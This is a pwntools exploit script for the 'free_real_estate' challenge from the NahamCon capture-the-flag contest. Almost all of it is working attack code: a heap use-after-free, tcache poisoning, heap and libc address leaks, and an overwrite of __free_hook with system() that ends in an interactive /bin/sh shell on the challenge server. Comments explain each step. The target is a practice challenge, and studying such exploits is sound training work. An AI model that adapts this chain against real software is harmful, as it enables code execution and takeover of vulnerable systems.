#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template free_real_estate
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('free_real_estate')
libc = ELF('./libc.so.6')

HOST, PORT = "challenge.nahamcon.com 32675".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

class Property(object):
    
    def __init__(self: object, number: int, street: bytes, price: float, comment: bytes) -> object:
        self.number = number
        self.street = street
        self.price = price
        self.comment = comment


def menu_choice(choice: int) -> None:
    io.sendlineafter(b"> ", str(choice).encode())

def show_property() -> bytes:
    menu_choice(1)
    io.recvuntil(b"number: ")
    number = int(io.recvline().strip(), 10)
    io.recvuntil(b"name: ")
    street = io.recvline().strip()
    io.recvuntil(b"Price: $")
    price = float(io.recvline().strip())
    io.recvuntil(b"Comment: ")
    comment = io.recvline().strip()
    return Property(number, street, price, comment)

def add_property(
        number: int,
        street: bytes,
        price: float,
        comment: bytes,
        comment_len: int = 0,
        street_len: int = 0
) -> None:
    menu_choice(2)
    io.sendlineafter(b"number: ", str(number).encode())
    street_len = (len(street)+1) if not street_len else street_len
    io.sendlineafter(b"name: ", str(street_len).encode())
    io.sendlineafter(b"name: ", street)
    io.sendlineafter(b"property?: ", str(price).encode())
    is_comment = b"n" if comment is None else b"y"
    io.sendlineafter(b"[y/n]: ", is_comment)
    if comment is None:
        return
    comment_len = (len(comment)+1) if not comment_len else comment_len
    io.sendlineafter(b"comment?: ", str(comment_len).encode())
    io.sendlineafter(b"comment: ", comment)

def remove_property() -> None:
    menu_choice(3)

def edit_property(
    number: int,
    street: bytes,
    price: float,
    comment: bytes,
    comment_len: int = 0,
    street_len: int = 0
) -> None:
    menu_choice(4)
    decision = b"n" if number is None else b"y"
    io.sendlineafter(b"[y/n]: ", decision)
    if number is not None:
        io.sendlineafter(b"number: ", str(number).encode())
    decision = b"n" if street is None else b"y"
    io.sendlineafter(b"[y/n]: ", decision)
    if street is not None:
        street_len = (len(street)+1) if not street_len else street_len
        io.sendlineafter(b"length: ", str(street_len).encode())
        io.sendlineafter(b"name: ", street)
    decision = b"n" if price is None else b"y"
    io.sendlineafter(b"[y/n]: ", decision)
    if price is not None:
        io.sendlineafter(b"property?: ", str(price).encode())
    decision = b"n" if comment is None else b"y"
    io.sendlineafter(b"[y/n]: ", decision)
    if comment is not None:
        comment_len = (len(comment)+1) if not comment_len else comment_len
        io.sendlineafter(b": ", str(comment_len).encode())
        io.sendlineafter(b"comment: ", comment)

def change_name(name: bytes, name_len: int = 0) -> None:
    menu_choice(5)
    name_len = (len(name)+1) if not name_len else name_len
    io.sendlineafter(b"name?: ", str(name_len).encode())
    io.sendlineafter(b"name: ", name)

io = start()

name = b"embe221ed"
io.sendlineafter(b"name: ", name)

small_chunk_size = 0x10
chunk_size = 0x50
big_chunk_size = 0x500

# create 0x500 chunk and another small chunk after it, for future use (libc leak)
add_property(10, b"A"*0x10, 1.1, b"B"*0x10, comment_len=small_chunk_size, street_len=big_chunk_size)
remove_property()

# allocate two 0x50 chunks
add_property(10, b"A"*0x10, 1.1, b"B"*0x10, comment_len=chunk_size, street_len=chunk_size)
# free 0x50 street name chunk
edit_property(10, b"C"*0x20, None, None, street_len=chunk_size+0x10)
# free 0x50 comment chunk and 0x50 property chunk
remove_property()
# allocate one standard chunk, one small chunk
# currently the comment field is pointing to freed 0x50 chunk which is in tcache list,
# due to another chunk beeing in that list, the comment one has an fd pointer pointing to the second (street_name chunk)
add_property(10, b"D", None, None, street_len=small_chunk_size)

# leak heap address
property = show_property()
heap_leak = u64(property.comment.ljust(8, b"\x00"))
assert heap_leak > 0x550000000000
chunk_offset = 0x50
chunk = heap_leak - chunk_offset
big_chunk_offset = 0x130
big_chunk = heap_leak + big_chunk_offset
log.success(f"heap leak: {hex(heap_leak)}")
log.info(f"chunk @ {hex(chunk)}")
log.info(f"big chunk @ {hex(big_chunk)}")

# in order to be able to free(comments) I need to overwrite it's fd pointer
edit_property(None, None, None, p64(0xdeadbeef))
remove_property()

# add new property, poison tcache with the address of Property chunk
# allocated Property chunk's address is now in tcache list
add_property(10, p64(chunk), 1.1, b"ABCD", street_len=chunk_size)
# prepare the /bin/sh string and allocate first chunk from tcache
change_name(b"/bin/sh\x00", name_len=chunk_size)
# now, by allocating another chunk from the same tcache list
# we are getting Property object address, so now the comment field is pointing at Property address
# abuse that to leak libc address by changing comment address to big chunk
fake_property = (
    p64(0xdeadbeef) + p64(0xcafebabe)
    + p64(0x3ff1999999990001) + p64(0x1)
    + p64(chunk) + p64(0x80)
    + p64(big_chunk) + p64(0x80)
)
edit_property(None, None, None, fake_property, comment_len=chunk_size)

# leak libc address of main_arena + 96
property = show_property()
libc_leak = u64(property.comment.ljust(8, b"\x00"))
libc_offset = 0x1ecbe0
libc.address = libc_leak - libc_offset
log.success(f"libc @ {hex(libc.address)}")

# having libc address we can change comment field to point at __free_hook
# and overwrite it in the next step with system()
fake_property = (
    p64(0xdeadbeef) + p64(0xcafebabe)
    + p64(0x3ff1999999990001) + p64(0x1)
    + p64(chunk) + p64(0x40)
    + p64(libc.sym["__free_hook"]) + p64(0x40)
)
edit_property(None, fake_property, None, None, street_len=chunk_size)
edit_property(None, None, None, p64(libc.sym.system))

# invoke __free_hook -> system("/bin/sh")
menu_choice(5)
io.sendlineafter(b"name?: ", str(0x500).encode())

io.interactive()

# Use After Free scenario:
# 1. Add property with an allocated buffer for a comment
# 2. Remove it
# 3. Add new property without comments
# 4. Comment address is not ovewrtiten with neither 0x0 nor new address
# 5. Accessing the comment means accessing the freed chunk (we can decide about it's size <- great)
